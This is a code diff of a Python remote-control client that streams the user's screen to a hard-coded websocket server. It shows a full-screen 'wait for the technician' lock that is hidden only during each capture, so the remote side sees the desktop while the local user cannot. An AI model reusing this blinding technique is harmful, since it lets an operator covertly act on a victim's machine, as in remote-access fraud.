@@ -8,18 +8,18 @@ import platform
 import getpass
 import hashlib
 import ctypes
-import ctypes.wintypes as wintypes
 import ssl
 import sys
 import subprocess
 from io import BytesIO
 
+import mss
 from PIL import Image
 import pyautogui
 import pyperclip
 
 SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
-FRAME_INTERVAL = 0.05
+FRAME_INTERVAL = 0.06
 QUALITY = 70
 SCALE = 0.75
 
@@ -36,18 +36,13 @@ ws_app = None
 running = True
 screen_locked = False
 lock_hwnd = None
+lock_visible = True
 
 user32 = ctypes.windll.user32
-gdi32 = ctypes.windll.gdi32
 
-# Tentar importar d3dshot para DXGI capture
-try:
-    import d3dshot
-    d3d = d3dshot.create(capture_output="pil")
-    USE_DXGI = True
-except:
-    import mss
-    USE_DXGI = False
+SW_HIDE = 0
+SW_SHOW = 5
+SW_SHOWNA = 8
 
 
 def set_console_title(title):
@@ -140,19 +135,20 @@ def get_system_info():
 
 
 # ============================================
-# LOCK SCREEN COM WDA_EXCLUDEFROMCAPTURE
+# LOCK SCREEN
 # ============================================
 
 def show_lock_screen(message):
-    global screen_locked, lock_hwnd
+    global screen_locked, lock_hwnd, lock_visible
 
     if screen_locked:
         return
 
     screen_locked = True
+    lock_visible = True
 
     def run_lock():
-        global lock_hwnd, screen_locked
+        global lock_hwnd, screen_locked, lock_visible
         try:
             import tkinter as tk
 
@@ -173,19 +169,14 @@ def show_lock_screen(message):
 
             root.update_idletasks()
 
-            # Obter HWND e aplicar WDA_EXCLUDEFROMCAPTURE
             try:
                 hwnd = user32.GetParent(root.winfo_id())
                 if hwnd == 0:
                     hwnd = root.winfo_id()
                 lock_hwnd = hwnd
-
-                # WDA_EXCLUDEFROMCAPTURE = 0x11
-                user32.SetWindowDisplayAffinity(hwnd, 0x11)
             except:
                 lock_hwnd = None
 
-            # Conteudo
             frame = tk.Frame(root, bg='#0a0a0a')
             frame.place(relx=0.5, rely=0.5, anchor='center')
 
@@ -196,16 +187,22 @@ def show_lock_screen(message):
             tk.Label(frame, text="Por favor, aguarde o tecnico liberar a tela.",
                     font=('Segoe UI', 14), bg='#0a0a0a', fg='#666666').pack(pady=10)
 
-            def check_close():
+            def update_visibility():
+                global lock_visible
                 if not screen_locked:
                     root.quit()
                     root.destroy()
                     return
-                root.lift()
-                root.attributes('-topmost', True)
-                root.after(100, check_close)
 
-            root.after(100, check_close)
+                # Sincronizar visibilidade com a flag
+                if lock_visible:
+                    root.deiconify()
+                    root.lift()
+                    root.attributes('-topmost', True)
+
+                root.after(30, update_visibility)
+
+            root.after(50, update_visibility)
             root.mainloop()
 
         except:
@@ -218,42 +215,20 @@ def show_lock_screen(message):
 
 
 def hide_lock_screen():
-    global screen_locked, lock_hwnd
+    global screen_locked, lock_hwnd, lock_visible
     screen_locked = False
+    lock_visible = True
     lock_hwnd = None
 
 
 # ============================================
-# CAPTURA DE TELA (DXGI ou MSS)
+# CAPTURA DE TELA
 # ============================================
 
-def capture_frame_dxgi():
-    """Captura via DXGI Desktop Duplication"""
-    try:
-        img = d3d.screenshot()
-        if img:
-            return img
-    except:
-        pass
-    return None
-
-
-def capture_frame_mss(sct):
-    """Captura via MSS/BitBlt"""
-    try:
-        monitor = sct.monitors[1]
-        screenshot = sct.grab(monitor)
-        return Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
-    except:
-        return None
-
-
 def capture_screen():
-    global panel_connected, running, current_quality, current_scale
+    global panel_connected, running, current_quality, current_scale, lock_hwnd, lock_visible
 
-    if not USE_DXGI:
-        import mss
-        sct = mss.mss()
+    sct = mss.mss()
 
     while running:
         if not panel_connected:
@@ -261,27 +236,32 @@ def capture_screen():
             continue
 
         try:
-            # Capturar frame
-            if USE_DXGI:
-                img = capture_frame_dxgi()
-            else:
-                img = capture_frame_mss(sct)
+            hwnd = lock_hwnd if screen_locked else None
 
-            if img is None:
-                time.sleep(0.1)
-                continue
+            # Esconder janela de lock antes da captura
+            if hwnd:
+                user32.ShowWindow(hwnd, SW_HIDE)
+                time.sleep(0.005)  # 5ms para garantir
 
-            # Redimensionar
+            # Capturar
+            monitor = sct.monitors[1]
+            screenshot = sct.grab(monitor)
+
+            # Mostrar janela de lock depois da captura
+            if hwnd:
+                user32.ShowWindow(hwnd, SW_SHOW)
+                user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0001 | 0x0002 | 0x0010)  # TOPMOST
+
+            img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
+
             new_w = int(img.width * current_scale)
             new_h = int(img.height * current_scale)
             img = img.resize((new_w, new_h), Image.LANCZOS)
 
-            # Comprimir
             buffer = BytesIO()
             img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
             frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
 
-            # Enviar
             if ws_app and is_connected:
                 ws_app.send(json.dumps({
                     "type": "screen-frame",
